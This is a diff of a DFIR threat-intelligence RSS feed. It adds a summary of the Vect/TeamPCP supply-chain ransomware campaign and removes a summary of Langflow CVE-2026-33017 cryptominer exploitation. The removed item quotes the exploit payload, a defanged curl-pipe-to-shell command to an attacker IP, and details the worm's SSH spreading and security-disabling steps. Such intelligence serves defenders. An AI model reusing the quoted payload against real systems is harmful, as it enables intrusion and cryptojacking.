@@ -5,8 +5,29 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Thu, 02 Jul 2026 13:03:00 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 02 Jul 2026 14:03:10 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Vect and TeamPCP partner for ransomware campaigns</title>
+      <link>https://www.sophos.com/en-us/blog/vect-and-teampcp-partner-for-ransomware-campaigns</link>
+      <description>Vect RaaS and TeamPCP formalize a supply chain-to-ransomware pipeline: credential theft across open-source tooling feeds industrialized extortion across 1,000+ SaaS environments.
+
+Key details:
+
+- TeamPCP (also known as PCPcat, ShellForce, DeadCatx3) exploited CVE-2025-55182 (CVSS 10.0), a pre-auth RCE in React Server Components, then pivoted to supply chain attacks on Trivy, Checkmarx KICS and AST GitHub Actions, LiteLLM (versions 1.82.7 and 1.82.8), and Telnyx Python SDK (versions 4.87.1 and 4.87.2). CanisterWorm propagated the compromise across 48+ npm packages. Outbound port 666 is a network signature from the earlier worm phase.
+
+- The credential harvest was massive: roughly 300 GB of compressed data and an estimated 500,000 credential sets exfiltrated, including cloud credentials, GitHub tokens, and Bitwarden CLI secrets. Exfil used a domain mimicking Checkmarx infrastructure; fallback was a hidden repository created inside the victim's own GitHub org.
+
+- Vect, a RaaS operation active since December 2025, claimed 154 victims within two months. A confirmed flaw causes files larger than 128 KB to be permanently destroyed rather than encrypted, making ransom payment potentially irreversible data loss.
+
+- Lapsus$ claimed Checkmarx on its leak site. TeamPCP previously ran CipherForce, which listed six victims before rebranding in May 2026.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2072682494332473743</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2072682494332473743">DFIR Radar</source>
+      <pubDate>Thu, 02 Jul 2026 14:03:10 +0000</pubDate>
+      <guid isPermaLink="false">2072682494332473743</guid>
+    </item>
     <item>
       <title>Rule Fixes &amp; Tuning Tips #20260629</title>
       <link>https://detections-digest.rulecheck.io/p/rule-fixes-and-tuning-tips-20260629</link>
@@ -1705,27 +1726,6 @@ Key details:
       <source url="https://x.com/DFIR_Radar/status/2069436006772936967">DFIR Radar</source>
       <pubDate>Tue, 23 Jun 2026 15:02:47 +0000</pubDate>
       <guid isPermaLink="false">2069436006772936967</guid>
-    </item>
-    <item>
-      <title>From Langflow to Monero: Inside CVE-2026-33017 Cryptominer</title>
-      <link>https://www.trendmicro.com/en_us/research/26/f/from-langflow-to-monero-inside-cve-2026-33017-cryptominer.html</link>
-      <description>CVE-2026-33017, an unauthenticated RCE in Langflow's public flow build endpoint, is being actively exploited to deliver a Go-based cryptominer with SSH worm lateral movement, defense evasion across AppArmor/SELinux/Aliyun, and dual-watchdog persistence.
-
-Key findings:
-
-- Initial access is a single unauthenticated POST to /api/v1/build_public_tmp/{flow_id}/flow with __import__('os').system('curl hxxp[://]83.142.209[.]214:8080/isp[.]sh | sh') (T1190, T1059.006). The operator reused flow_id 0ee284cc-0eb1-493f-bc60-94fa8d1cfd18 across 19 days of observed attacks, a detection gift. Recon used 10 spoofed UAs in 5 seconds before switching to a stable python-requests/2.25.1 for exploitation.
-
-- Dropper isp.sh creates /var/tmp/.xlamb/, downloads the UPX-packed Go ELF lambsys, then SSH-worms to every host in known_hosts plus ssh-agent loaded keys using BatchMode=yes and StrictHostKeyChecking=no (T1021.004, T1552.004). Scope is directly tied to Langflow's deployment privileges.
-
-- lambsys (SHA256: 71af8bd9...) runs a 39-process kill list targeting Kinsing, WatchDog, Outlaw, and Rocke rivals, kills processes on 12 mining ports via netstat, disables AppArmor, SELinux, UFW, iptables, the kernel NMI watchdog, and Aliyun's security agent, then deletes /var/log/syslog (T1562.001, T1562.004, T1070.002).
-
-- Persistence is a cron job every 5 minutes plus init_rmount at /var/tmp/init_rmount on a 60-second loop, both re-downloading lambsys from C&amp;C if missing.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2069421008604536876</description>
-      <category>VULNERABILITY</category>
-      <source url="https://x.com/DFIR_Radar/status/2069421008604536876">DFIR Radar</source>
-      <pubDate>Tue, 23 Jun 2026 14:03:11 +0000</pubDate>
-      <guid isPermaLink="false">2069421008604536876</guid>
     </item>
   </channel>
 </rss>
